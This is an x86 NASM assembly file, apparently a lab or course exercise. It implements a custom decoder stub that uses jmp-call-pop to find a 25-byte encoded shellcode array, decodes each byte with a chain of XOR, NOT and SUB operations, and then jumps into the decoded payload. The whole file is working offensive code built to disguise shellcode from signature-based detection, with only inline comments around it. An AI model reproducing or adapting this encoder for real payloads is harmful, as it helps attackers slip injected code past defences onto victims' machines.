; custom-decoder.nasm
; Author: Alex


global _start

section .text ; stores the main program code

_start:

    jmp short call_decoder


decoder:
    pop esi       ; pop the shellcode address into ESI
    xor ecx, ecx  ; zero out ECX
    mov cl, 25    ; store the length of the shellcode in bytes in CL

decode:
    xor byte [esi], 0xA9
    not byte [esi]
    xor byte [esi], 0xCC
    sub byte [esi], 0x0A
    xor byte [esi], 0xBB
    sub byte [esi], 0x05

    inc esi        ; move to the next byte that will be decoded
    loop decode    ; since ECX (CL) is now loaded with the value of 25, it will loop 25 times decreasing ECX each time until it becomes zero, and it will then perform the below short jump to the decoded shellcode

    jmp short Shellcode


call_decoder:

    call decoder

    Shellcode: db 0x0d,0x12,0x62,0x7a,0x03,0x03,0x57,0x7a,0x7a,0x03,0x7c,0x45,0x48,0xa5,0xc7,0x62,0xa5,0xfc,0x77,0xa5,0xfd,0x82,0x2f,0xe9,0xd2
